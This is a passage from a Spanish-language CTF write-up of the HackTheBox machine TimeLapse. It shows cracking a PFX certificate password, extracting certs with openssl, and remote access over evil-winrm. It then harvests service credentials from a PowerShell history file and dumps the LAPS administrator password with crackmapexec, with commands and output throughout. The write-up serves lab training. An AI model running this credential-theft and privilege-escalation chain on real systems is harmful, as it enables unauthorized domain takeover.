</pre></table></code></div></div><p>Obetenemos la contraseña <code class="language-plaintext highlighter-rouge">sumpremelegacy</code>; por lo que, ahora podemos descomprimir el archivo <code class="language-plaintext highlighter-rouge">winrm_backup.zip</code>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>❯ unzip winrm_backup.zip
Archive:  winrm_backup.zip
<span class="o">[</span>winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx   
</pre></table></code></div></div><p>Ya que es un archivo con extensión <code class="language-plaintext highlighter-rouge">pfx</code>, podemos hacer una búsqueda rápida en internet del <a href="https://www.reviversoft.com/es/file-extensions/pfx">para qué sirve</a>. Como dice en el artículo:</p><blockquote><p>…incluyen certificados digitales utilizados para procesos de autenticación necesarias para determinar si un usuario o un dispositivo puede acceder a ciertos archivos.</p></blockquote><p>Podemos intentar conectarnos a la máquina víctima pero para ello necesitamos primero extraer el <code class="language-plaintext highlighter-rouge">certificado</code> y la <code class="language-plaintext highlighter-rouge">llave</code> del archivo <code class="language-plaintext highlighter-rouge">pfx</code> como se muestra <a href="https://red-orbita.com/?p=8235">aquí</a>. Al intentar hacerlo, nos pide la contraseña del archivo; por lo que, nuevamente tendremos que obtener una contraseña.</p><p>Para variar no usaremos <code class="language-plaintext highlighter-rouge">John the Ripper</code>, una alternativa sería <a href="https://github.com/crackpkcs12/crackpkcs12">crackpkcs12</a>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>❯ crackpkcs12 <span class="nt">-d</span> /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nt">-v</span> <span class="nt">-t</span> 10 legacyy_dev_auth.pfx 

Dictionary attack - Starting 10 threads

Performance:              3230962 passwords <span class="o">[</span>    2005 passwords per second]
<span class="k">*********************************************************</span>
Dictionary attack - Thread 1 - Password found: thuglegacy
<span class="k">*********************************************************</span>
</pre></table></code></div></div><ul><li>-d: Directory/Directorio de contraseñas.<li>-v: Verbose mode/Modo verbose.<li>-t: Threads/Hilos.</ul><blockquote class="prompt-info"><div><p>Para obtener el hash equivalente y posteriormente crackearlo con <code class="language-plaintext highlighter-rouge">John the Ripper</code> usaríamos <code class="language-plaintext highlighter-rouge">pfx2john</code>, de igual forma a como hicimos con <a href="#crackeando-contraseñas"><em>zip2john</em></a>.</p></div></blockquote><p>Obtenemos la contraseña <code class="language-plaintext highlighter-rouge">thuglegacy</code>. Ahora sí podemos crear el certificado y la llave (ingresando la contraseña obtenida) que nos permita conectarnos a la máquina víctima:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>❯ openssl pkcs12 <span class="nt">-in</span> legacyy_dev_auth.pfx <span class="nt">-clcerts</span> <span class="nt">-nokeys</span> <span class="nt">-out</span> certificate  
Enter Import Password:
❯ openssl pkcs12 <span class="nt">-in</span> legacyy_dev_auth.pfx <span class="nt">-nocerts</span> <span class="nt">-out</span> key       
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
</pre></table></code></div></div><blockquote class="prompt-warning"><div><p>Para el <code class="language-plaintext highlighter-rouge">PEM pass phrase</code> y la verificación puse “rabb1t”.</p></div></blockquote><h2 id="obteniendo-acceso-como-legacyy"><span class="mr-2">Obteniendo acceso como legacyy</span><a href="#obteniendo-acceso-como-legacyy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Ahora podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> via SSL.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>❯ evil-winrm <span class="nt">-S</span> <span class="nt">-c</span> certificate <span class="nt">-k</span> key <span class="nt">-i</span> 10.10.11.152

Evil-WinRM shell v3.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\l</span>egacyy<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>timelapse<span class="se">\l</span>egacyy
</pre></table></code></div></div><p>Antes de ejecutar <code class="language-plaintext highlighter-rouge">winpeas</code>, podemos hacer una enumeración manual siguiendo los pasos de <em>escalada de privilegios de <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">hacktricks</a></em>, en el cual uno de los pasos es revisar el historial de powershell. Llegado a este punto, podemos hacer y ver lo siguiente:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\\</span>Users&gt; <span class="nb">cd</span> <span class="nv">$env</span>:APPDATA<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>PowerShell<span class="se">\\</span>PSReadLine
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\\</span>Users<span class="se">\\</span>legacyy<span class="se">\\</span>AppData<span class="se">\\</span>Roaming<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>PowerShell<span class="se">\\</span>PSReadLine&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\\</span>Users<span class="se">\\</span>legacyy<span class="se">\\</span>AppData<span class="se">\\</span>Roaming<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>PowerShell<span class="se">\\</span>PSReadLine


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         3/3/2022  11:46 PM            434 ConsoleHost_history.txt

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\\</span>Users<span class="se">\\</span>legacyy<span class="se">\\</span>AppData<span class="se">\\</span>Roaming<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>PowerShell<span class="se">\\</span>PSReadLine&gt; <span class="nb">type </span>ConsoleHost_history.txt
<span class="nb">whoami
</span>ipconfig /all
netstat <span class="nt">-ano</span> |select-string LIST
<span class="nv">$so</span> <span class="o">=</span> New-PSSessionOption <span class="nt">-SkipCACheck</span> <span class="nt">-SkipCNCheck</span> <span class="nt">-SkipRevocationCheck</span>
<span class="nv">$p</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'E3R$Q62^12p7PLlC%KWaxuaV'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="nv">$c</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="s1">'svc_deploy'</span>, <span class="nv">$p</span><span class="o">)</span>
invoke-command <span class="nt">-computername</span> localhost <span class="nt">-credential</span> <span class="nv">$c</span> <span class="nt">-port</span> 5986 <span class="nt">-usessl</span> -
SessionOption <span class="nv">$so</span> <span class="nt">-scriptblock</span> <span class="o">{</span><span class="nb">whoami</span><span class="o">}</span>
get-aduser <span class="nt">-filter</span> <span class="k">*</span> <span class="nt">-properties</span> <span class="k">*</span>
<span class="nb">exit</span>
</pre></table></code></div></div><p>Vemos que hay variables declaradas y que está ejecutando código <code class="language-plaintext highlighter-rouge">-scriptblock</code> en el puerto <code class="language-plaintext highlighter-rouge">5986</code> empleando SSL <code class="language-plaintext highlighter-rouge">-usessl</code> con las credenciales que están en la variable <code class="language-plaintext highlighter-rouge">$c</code>.</p><p>Podemos recrear este escenario configurando las mismas variables:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\\</span>Users<span class="se">\\</span>legacyy<span class="se">\\</span>AppData<span class="se">\\</span>Roaming<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>PowerShell<span class="se">\\</span>PSReadLine&gt; <span class="nv">$so</span> <span class="o">=</span> New-PSSessionOption <span class="nt">-SkipCACheck</span> <span class="nt">-SkipCNCheck</span> <span class="nt">-SkipRevocationCheck</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\\</span>Users<span class="se">\\</span>legacyy<span class="se">\\</span>AppData<span class="se">\\</span>Roaming<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>PowerShell<span class="se">\\</span>PSReadLine&gt; <span class="nv">$p</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'E3R$Q62^12p7PLlC%KWaxuaV'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\\</span>Users<span class="se">\\</span>legacyy<span class="se">\\</span>AppData<span class="se">\\</span>Roaming<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>PowerShell<span class="se">\\</span>PSReadLine&gt; <span class="nv">$c</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="s1">'svc_deploy'</span>, <span class="nv">$p</span><span class="o">)</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\\</span>Users<span class="se">\\</span>legacyy<span class="se">\\</span>AppData<span class="se">\\</span>Roaming<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>PowerShell<span class="se">\\</span>PSReadLine&gt; invoke-command <span class="nt">-computername</span> localhost <span class="nt">-credential</span> <span class="nv">$c</span> <span class="nt">-port</span> 5986 <span class="nt">-usessl</span> <span class="nt">-SessionOption</span> <span class="nv">$so</span> <span class="nt">-scriptblock</span> <span class="o">{</span><span class="nb">whoami</span><span class="o">}</span>
timelapse<span class="se">\s</span>vc_deploy
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>También podemos conectarnos a través de <code class="language-plaintext highlighter-rouge">evil-winrm</code> proporcionando la contraseña vía SSL</p></div></blockquote><p>¡Estamos ejecutando comandos como el usuario <code class="language-plaintext highlighter-rouge">svc_deploy</code>! Ahora vamos a enumerar este usuario para ver de qué nos podemos aprovechar:</p><h2 id="obteniendo-credenciales-mediante-laps"><span class="mr-2">Obteniendo credenciales mediante LAPS</span><a href="#obteniendo-credenciales-mediante-laps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\\</span>Users<span class="se">\\</span>legacyy<span class="se">\\</span>AppData<span class="se">\\</span>Roaming<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>PowerShell<span class="se">\\</span>PSReadLine&gt;  invoke-command <span class="nt">-computername</span> localhost <span class="nt">-credential</span> <span class="nv">$c</span> <span class="nt">-port</span> 5986 <span class="nt">-usessl</span> <span class="nt">-SessionOption</span> <span class="nv">$so</span> <span class="nt">-scriptblock</span> <span class="o">{</span>net user svc_deploy<span class="o">}</span>
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User<span class="se">\'</span>s comment
Country/region code          000 <span class="o">(</span>System Default<span class="o">)</span>
Account active               Yes
Account expires              Never

Password last <span class="nb">set            </span>10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/18/2022 9:12:42 AM

Logon hours allowed          All

Local Group Memberships      <span class="k">*</span>Remote Management Use
Global Group memberships     <span class="k">*</span>LAPS_Readers         <span class="k">*</span>Domain Users
The <span class="nb">command </span>completed successfully.
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>—Es aquí cuando he caído en cuenta que el nombre de la máquina es una pista a LAPS :P—</p></div></blockquote><p>Entre el reconocimiento básico encontramos que el usuario <code class="language-plaintext highlighter-rouge">svc_deploy</code> hace parte del grupo <code class="language-plaintext highlighter-rouge">LAPS_Readers</code>. Haciendo una búsqueda por nuestro navegador favorito encontramos un <a href="https://www.hackingarticles.in/credential-dumpinglaps/">artículo</a> sobre diferentes formas de obtener las contraseñas abusando de <code class="language-plaintext highlighter-rouge">LAPS</code>.</p><p>En nuestro caso obtendremos las credenciales usando <code class="language-plaintext highlighter-rouge">crackmapexec</code> —puedes usar cualquier otro método empleado en el artículo—.</p><h2 id="obteniendo-sesión-como-administrator"><span class="mr-2">Obteniendo sesión como Administrator</span><a href="#obteniendo-sesión-como-administrator" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Empleando <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos usar el módulo <code class="language-plaintext highlighter-rouge">laps</code> para obtener las contraseñas;</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>❯ crackmapexec ldap 10.10.11.152 <span class="nt">-u</span> svc_deploy <span class="nt">-p</span> <span class="s1">'E3R^12p7PLlC%KWaxuaV'</span> <span class="nt">--kdcHost</span> <span class="s1">'timelapse.htb'</span> <span class="nt">-M</span> laps
SMB         10.10.11.152    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:timelapse.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        10.10.11.152    389    DC01             <span class="o">[</span>+] timelapse.htb<span class="se">\s</span>vc_deploy:E3R<span class="nv">$Q62</span>^12p7PLlC%KWaxuaV 
LAPS        10.10.11.152    389    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting LAPS Passwords
LAPS        10.10.11.152    389    DC01             Computer: DC01<span class="nv">$ </span>               Password: 6jdi<span class="se">\#</span>U8Ju<span class="o">}</span>8Eq&amp;Gmw,yF<span class="se">\#</span><span class="o">}</span>iH
</pre></table></code></div></div><blockquote class="prompt-warning"><div><p>Para usar el argumento <code class="language-plaintext highlighter-rouge">--kdcHost</code> debimos anteriormente haber agregado el dominio al archivo <code class="language-plaintext highlighter-rouge">/etc/host</code> apuntando a la dirección IP de la máquina víctima.</p></div></blockquote><p>Nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> vía SSL (<code class="language-plaintext highlighter-rouge">-S</code>) como administrador.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>❯ evil-winrm <span class="nt">-S</span> <span class="nt">-i</span> 10.10.11.152 <span class="nt">-p</span> <span class="s2">"6jdi#U8Ju}8Eq&amp;Gmw,yF#}iH"</span> <span class="nt">-u</span> <span class="s2">"administrator"</span>

Evil-WinRM shell v3.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\\</span>Users<span class="se">\\</span>Administrator<span class="se">\\</span>Documents&gt; <span class="nb">whoami
</span>timelapse<span class="se">\\</span>Administrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\\</span>Users<span class="se">\\</span>Administrator<span class="se">\\</span>Documents&gt;
</pre></table></code></div></div><p>¡Happy Hacking!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/writeup/'>WriteUp</a>, <a href='/categories/machines/'>Machines</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pfx2john/" class="post-tag no-text-decoration" >pfx2john</a> <a href="/tags/zip2john/" class="post-tag no-text-decoration" >zip2john</a> <a href="/tags/john/" class="post-tag no-text-decoration" >john</a> <a href="/tags/laps/" class="post-tag no-text-decoration" >LAPS</a> <a href="/tags/pfx/" class="post-tag no-text-decoration" >PFX</a> <a href="/tags/crackmapexec/" class="post-tag no-text-decoration" >crackmapexec</a> <a href="/tags/evil-winrm/" class="post-tag no-text-decoration" >evil-winrm</a> <a href="/tags/smbclient/" class="post-tag no-text-decoration" >smbclient</a> <a href="/tags/openssl/" class="post-tag no-text-decoration" >OpenSSL</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=WriteUp+TimeLapse+HTB+-+rabb1t&url=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-TimeLapse-HTB%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=WriteUp+TimeLapse+HTB+-+rabb1t&u=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-TimeLapse-HTB%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-TimeLapse-HTB%2F&text=WriteUp+TimeLapse+HTB+-+rabb1t" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/burpsuite-socks/">Socks y BurpSuite</a><li><a href="/posts/WriteUp-Undetected-HTB/">WriteUp Undetected HTB</a><li><a href="/posts/WriteUp-Late-HTB/">WriteUp Late HTB</a><li><a href="/posts/WriteUp-TimeLapse-HTB/">WriteUp TimeLapse HTB</a><li><a href="/posts/WriteUp-Noter-HTB/">WriteUp Noter HTB</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssti/">SSTI</a> <a class="post-tag" href="/tags/anonimato/">Anonimato</a> <a class="post-tag" href="/tags/attacks-backdoor/">Attacks/Backdoor</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/chattr/">chattr</a> <a class="post-tag" href="/tags/code-analyse/">Code-analyse</a> <a class="post-tag" href="/tags/command-injection/">command-injection</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/cve-2021-23639/">CVE-2021-23639</a> <a class="post-tag" href="/tags/cyberchef/">CyberChef</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/WriteUp-Undetected-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1656910800" > 2022-07-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp Undetected HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas-y-recursos-empleados Fase de enumeración Explotando fallo de PHP Unit (CVE-2017-9841) Privesc steven Privesc root Máquina Undetec...</p></div></div></a></div><div class="card"> <a href="/posts/WriteUp-Late-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1659157200" > 2022-07-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp Late HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Explotando la vulnerabilidad SSTI Escalando privilegios Transición de archivos Anal...</p></div></div></a></div><div class="card"> <a href="/posts/WriteUp-Noter-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1662094800" > 2022-09-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp Noter HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas y recursos empleados Fase de enumeración Enumerando usuarios ¿Tienes algún secreto? Accediendo a ftp como blue A...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/WriteUp-Late-HTB/" class="btn btn-outline-primary" prompt="Anterior"><p>WriteUp Late HTB</p></a> <a href="/posts/WriteUp-Noter-HTB/" class="btn btn-outline-primary" prompt="Nuevo"><p>WriteUp Noter HTB</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "rabb1t-0/rabb1t-0.github.io", "data-repo-id": "R_kgDOHL8JPA", "data-category": "general", "data-category-id": "DIC_kwDOHL8JPM4CPeS9", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/rabb1t-0">rabb1t</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssti/">SSTI</a> <a class="post-tag" href="/tags/anonimato/">Anonimato</a> <a class="post-tag" href="/tags/attacks-backdoor/">Attacks/Backdoor</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/chattr/">chattr</a> <a class="post-tag" href="/tags/code-analyse/">Code-analyse</a> <a class="post-tag" href="/tags/command-injection/">command-injection</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/cve-2021-23639/">CVE-2021-23639</a> <a class="post-tag" href="/tags/cyberchef/">CyberChef</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
